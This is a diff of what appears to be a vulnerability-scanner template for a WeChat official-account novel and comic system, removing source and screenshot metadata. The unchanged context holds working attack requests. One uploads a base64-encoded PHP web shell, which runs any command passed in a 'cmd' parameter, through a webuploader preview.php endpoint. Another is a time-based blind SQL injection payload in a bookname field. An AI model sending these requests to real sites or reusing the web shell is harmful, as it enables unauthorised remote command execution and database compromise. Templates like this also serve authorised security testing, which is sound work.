@@ -3,14 +3,8 @@ info:
   name: 微信公众号小说漫画系统多个漏洞合集
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fi7snq0gxzf88boy
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: other,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fi7snq0gxzf88boy
-    fofa: '"Public/home/mhjs/jquery.js"'
 http:
 - raw:
   - 'POST /Public/webuploader/0.1.5/server/preview.php HTTP/1.1
@@ -51,7 +45,6 @@ http:
 
     data:image/php;base64,PD9waHANCiAgICBpZihpc3NldCgkX1JFUVVFU1RbJ2NtZCddKSl7DQogICAgICAgICAgICBlY2hvICI8cHJlPiI7DQogICAgICAgICAgICAkY21kID0gKCRfUkVRVUVTVFsnY21kJ10pOw0KICAgICAgICAgICAgc3lzdGVtKCRjbWQpOw0KICAgICAgICAgICAgZWNobyAiPC9wcmU+IjsNCiAgICAgICAgICAgIGRpZTsNCiAgICB9DQogICAgcGhwaW5mbygpOw0KPz4=
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739792819109-26cb90a7-e9eb-4115-9674-40c9292f24f3.png)
 
     **前台任意文件上传漏洞**'
   redirects: false
@@ -216,9 +209,7 @@ http:
 
     sec-fetch-user: ?1
 
-    sl=1&bookname='' AND (SELECT 2775 FROM (SELECT(SLEEP(5)))IiIJ)-- XrlG
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739792819355-fca4370b-a93e-45fc-a952-7732bbac1302.png)'
+    sl=1&bookname='' AND (SELECT 2775 FROM (SELECT(SLEEP(5)))IiIJ)-- XrlG'
   redirects: false
   matchers:
   - type: dsl
